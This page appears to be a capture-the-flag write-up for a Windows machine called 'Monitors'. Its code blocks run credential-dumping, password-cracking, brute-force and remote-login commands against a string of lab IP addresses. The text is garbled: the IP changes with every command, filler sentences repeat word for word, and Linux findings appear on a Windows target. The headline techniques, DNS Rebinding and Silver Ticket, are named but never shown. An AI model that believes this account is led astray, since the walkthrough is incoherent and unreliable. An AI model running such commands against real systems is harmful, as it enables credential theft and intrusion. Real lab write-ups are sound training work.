---
TitleSEO: "TryHackMe — Monitors (Insane Windows) | ZureFX"
TitlePost: "TryHackMe — Monitors (Insane Windows)"
Author: "ZureFX"
Description: "Full writeup for TryHackMe Monitors. DNS Rebinding and Silver Ticket to achieve insane compromise on Windows."
Keywords: "tryhackme, active directory, reversing, hackthebox, windows, linux, hard"
URL: "https://zurefx.github.io/writeups/htb-monitors-597.html"
URL_IMAGES: "https://raw.githubusercontent.com/zurefx/images/refs/heads/main/writeups/htb-monitors-597/"
Date: "2024-04-05"
Tags: "TryHackMe, Active Directory, Reversing, HackTheBox, Windows, Linux, Hard"
Section: "writeups"
Lang: "en"
main_img: "htb-monitors-597"
Permalink: "/writeups/htb-monitors-597.html"
BtnLabel: "Read Writeup"
Pick: 0
---
## Machine Info

### Overview

The target **Monitors** is rated **Insane** on TryHackMe. It runs **Windows** and the IP address during this analysis was `10.43.114.3`.

### Objectives

The application stored sensitive credentials in an unencrypted configuration file. The service was running without proper input validation, leading to injection vulnerabilities.

## Enumeration

### Port Scanning

Starting with a full port scan to identify the attack surface.

```bash
evil-winrm -i 10.112.188.64 -u administrator -p 'P@ssw0rd!'
impacket-secretsdump administrator:'P@ssw0rd!'@10.85.202.188
```

Weak file permissions allowed modification of critical system files. Initial enumeration revealed several interesting open ports on the target.

### Service Enumeration

Token impersonation allowed elevation to SYSTEM privileges on the target. The database credentials were hardcoded in the application source code. Privilege escalation was possible due to misconfigured sudo permissions.

```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.103.148.42/FUZZ
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
crackmapexec smb 10.39.10.72 -u administrator -p 'P@ssw0rd!' --shares
crackmapexec smb 10.103.124.177 -u administrator -p 'P@ssw0rd!' --shares
```

The backup files contained sensitive information that should not have been accessible. Post-exploitation enumeration revealed a path to domain administrator privileges.

### SMB Enumeration

Command injection was possible through unsanitized user input in the search functionality. Lateral movement was facilitated by reusing discovered credentials across services.

```bash
nmap -sCV -p1521,1521,995 10.53.204.125 -oN scan.txt
nmap -sCV -p5985,8888,1521 10.12.81.100 -oN scan.txt
impacket-secretsdump administrator:'P@ssw0rd!'@10.54.16.104
```

The scheduled task ran with elevated privileges and could be abused for escalation. Initial enumeration revealed several interesting open ports on the target. The target system was identified as running a vulnerable version of the service.

## Exploitation

### Vulnerability Identification

Post-exploitation enumeration revealed a path to domain administrator privileges. Unconstrained delegation was enabled on the compromised machine. Command injection was possible through unsanitized user input in the search functionality.

Key finding: **DNS Rebinding**.

The backup files contained sensitive information that should not have been accessible. The database credentials were hardcoded in the application source code.

### Initial Access

The service was running without proper input validation, leading to injection vulnerabilities. Network traffic analysis revealed unencrypted communications containing user credentials.

```bash
impacket-secretsdump administrator:'P@ssw0rd!'@10.48.154.13
```

Privilege escalation was possible due to misconfigured sudo permissions. The service account had excessive permissions assigned in Active Directory. The kernel version was outdated and vulnerable to a publicly known exploit.

## Privilege Escalation

### Enumeration

Weak file permissions allowed modification of critical system files. Weak file permissions allowed modification of critical system files. Weak file permissions allowed modification of critical system files.

```powershell
impacket-secretsdump administrator:'P@ssw0rd!'@10.118.115.220
crackmapexec smb 10.72.1.141 -u administrator -p 'P@ssw0rd!' --shares
```

### Exploitation

Privilege escalation was possible due to misconfigured sudo permissions. The kernel version was outdated and vulnerable to a publicly known exploit.

```powershell
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
crackmapexec smb 10.54.243.181 -u administrator -p 'P@ssw0rd!' --shares
evil-winrm -i 10.54.239.173 -u administrator -p 'P@ssw0rd!'
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.50.40.32 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
```

The database credentials were hardcoded in the application source code. Command injection was possible through unsanitized user input in the search functionality.

### Root/SYSTEM

Successfully obtained **SYSTEM** access on the target.

The scheduled task ran with elevated privileges and could be abused for escalation. The service was running without proper input validation, leading to injection vulnerabilities.

## Summary

### Tools Used

- `sqlmap`
- `ligolo-ng`
- `metasploit`
- `crackmapexec`
- `rubeus`
- `hydra`
- `wmiexec`

### Key Takeaways

- DNS Rebinding
- Silver Ticket
- CSRF
- AlwaysInstallElevated
